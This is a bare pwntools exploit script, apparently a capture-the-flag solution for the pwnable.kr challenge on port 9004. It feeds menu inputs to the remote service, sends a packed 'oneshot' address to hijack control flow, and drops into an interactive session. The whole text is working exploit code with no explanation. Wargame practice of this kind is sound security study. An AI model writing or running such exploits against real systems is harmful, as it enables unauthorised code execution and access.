from pwn import *

s = remote("pwnable.kr",9004)

oneshot = 0x08048DBF

s.sendline("2")
s.sendline("2")

s.sendline("1")

for i in range(4):
	s.sendline("3")
	s.sendline("3")
	s.sendline("2")

s.send(p32(oneshot))

s.interactive()
